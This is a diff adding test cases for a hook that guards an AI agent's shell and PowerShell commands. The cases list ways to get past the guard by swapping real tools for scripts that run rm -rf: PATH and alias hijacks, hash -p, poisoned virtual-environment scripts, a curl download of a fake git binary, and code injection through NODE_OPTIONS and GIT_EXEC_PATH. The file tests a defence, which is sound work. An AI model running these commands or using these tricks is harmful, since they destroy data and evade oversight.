@@ -4870,6 +4870,109 @@ describe("PreToolUse hook - a variable setter in any spelling (re-probe 7, H5)",
   }
 });
 
+describe("PreToolUse hook - a program the command can have replaced earns no exemption (re-probe 7, H6)", () => {
+  const script = (arg) => `printf '#!/bin/sh\\nrm -rf "$${arg}"\\n'`;
+  for (const command of [
+    // The re-probe's forms: PATH and hash -p.
+    `mkdir -p bin; ${script(3)} > bin/g.sh; chmod +x bin/g.sh; cp bin/g.sh bin/git; PATH=./bin:/usr/bin; git commit -m security`,
+    `${script(3)} > g.sh; chmod +x g.sh; hash -p ./g.sh git; git commit -m security`,
+    `${script(1)} > x; chmod +x x; hash -p ./x pytest; pytest security`,
+    `mkdir -p bin; ${script(2)} > bin/npm; chmod +x bin/npm; export PATH=./bin; npm run security`,
+    // PATH with a relative, an empty or an unknown entry, in any spelling.
+    "PATH=.:$PATH; npm run security",
+    "PATH=:$PATH; git commit -m security",
+    'export PATH="$PWD/bin:$PATH"; git commit -m security',
+    "export PATH=$TOOLS:$PATH; git commit -m security",
+    "Path=./bin:$PATH; git commit -m security",
+    // The other commands that put a program under a name.
+    "builtin hash -p ./g.sh git; git commit -m security",
+    "enable -f ./x.so git; git commit -m security",
+    "alias git='rm -rf'; git commit -m security",
+    'git() { rm -rf "$3"; }; git commit -m security',
+    'cmd //c "path .\\bin;%path% & git commit -m security"',
+    // A program spelled with a path inside the project.
+    `${script(3)} > git; chmod +x git; ./git commit -m security`,
+    `${script(1)} > jest; chmod +x jest; ./jest security`,
+    "bin/git commit -m security",
+    "src/../git commit -m security",
+    "./grep -rn security docs",
+    "./cat .claude/settings.json",
+    // A file written under the program's name where PATH, npx or Python finds it.
+    `${script(3)} > ~/bin/git; chmod +x ~/bin/git; git commit -m security`,
+    `${script(1)} > ~/bin/cat; chmod +x ~/bin/cat; cat security`,
+    `${script(1)} > node_modules/.bin/jest; chmod +x node_modules/.bin/jest; npx jest security`,
+    `${script(1)} > node_modules/.bin/jest; yarn jest security`,
+    `${script(1)} > x; mv x ~/bin/gi[t]; git commit -m security`,
+    `${script(1)} > x; mv x ~/bin/gi{t,}; git commit -m security`,
+    `${script(1)} > x; mv x GIT; git commit -m security`,
+    "curl -sSLo ~/bin/git.exe https://example.test/g; git commit -m security",
+    "printf 'import shutil,sys; shutil.rmtree(sys.argv[-1])' > pytest.py; python -m pytest security",
+    `python -c "open('/home/u/bin/git','w').write('x')"; git commit -m security`,
+    // A value in the environment that names what a program runs.
+    "export GIT_EXEC_PATH=/tmp/x; git commit -m security",
+    "export NODE_OPTIONS='--require /tmp/e.js'; npm run security",
+    "HOME=/tmp/x; git commit -m security",
+    "declare -x PYTHONSTARTUP=/tmp/e.py; pytest -k security",
+    "export NODE_ENV=test EVIL=1 && npm run security",
+    // PATH outside the project, or a virtual environment, with a stage that writes (Lex's ruling on the PUSHBACK).
+    `${script(3)} > /tmp/git; chmod +x /tmp/git; PATH=/tmp:$PATH; git commit -m security`,
+    `printf 'git(){ rm -rf "$3"; }\\n' > .venv/bin/activate; source .venv/bin/activate; git commit -m security`,
+    "export PATH=/usr/local/bin:$PATH; cp -r evil/. /usr/local/bin/; git commit -m security",
+    "source .venv/bin/activate && pip install -r requirements.txt && pytest -k security",
+    "cp -r evil/. node_modules/.bin/; ./node_modules/.bin/jest security",
+    "source ./env.sh && pytest -k security",
+  ]) {
+    stagedOnly(`asks: ${command}`, () => {
+      const out = runGuarded(command);
+      assert.equal(decisionOf(out), "ask", `${command} -> ${out.slice(0, 200) || "(silent)"}`);
+    });
+  }
+
+  for (const command of [
+    "Set-Alias pytest Remove-Item; pytest security",
+    "sal pytest ri; pytest security",
+    "New-Alias git Remove-Item; git security",
+    ".\\git.cmd commit -m security",
+    "Set-Item env:GIT_EXEC_PATH C:\\x; git commit -m security",
+  ]) {
+    stagedOnly(`asks, PowerShell tool: ${command}`, () => {
+      const out = runGuarded(command, { tool: "PowerShell" });
+      assert.equal(decisionOf(out), "ask", `${command} -> ${out.slice(0, 200) || "(silent)"}`);
+    });
+  }
+
+  for (const command of [
+    // PATH gains an absolute folder outside the project; every other stage is exempt, reads or moves.
+    'export PATH="$HOME/.local/bin:$PATH" && pytest -k security',
+    "export PATH=/usr/local/bin:$PATH && npm run security",
+    'export PATH="$HOME/.local/bin:$PATH" && cd backend && pytest -k security',
+    // A virtual environment.
+    "source .venv/bin/activate && pytest -k security",
+    ". .venv/Scripts/activate && npm run security",
+    "source venv/bin/activate && pytest -k security",
+    "cd backend && source .venv/bin/activate && pytest -k security",
+    // A program at an absolute path outside the project, or where a package manager puts it.
+    "/usr/bin/git commit -m security",
+    "/usr/bin/grep -rn security docs",
+    "./node_modules/.bin/jest security",
+    ".venv/bin/pytest -k security",
+    "./manage.py test security",
+    // No stage writes a file under the program's name.
+    'git add -A && git commit -m "security fix"',
+    'git commit -m security && git push origin "$(git branch --show-current)"',
+    "npm ci && npm test -- security",
+    "cd test && npm test -- security",
+    'echo "## Security" >> README.md && git commit -am "docs: security"',
+    // A name known to carry nothing a program runs.
+    "export NODE_ENV=test PORT=3000 && npm run security",
+    "export CI=true && pytest -k security",
+  ]) {
+    stagedOnly(`silent: ${command}`, () => {
+      expectSilent(runGuarded(command, { mode: "bypassPermissions" }));
+    });
+  }
+});
+
 // ---------------------------------------------------------------------------
 // RESULTS
 // ---------------------------------------------------------------------------
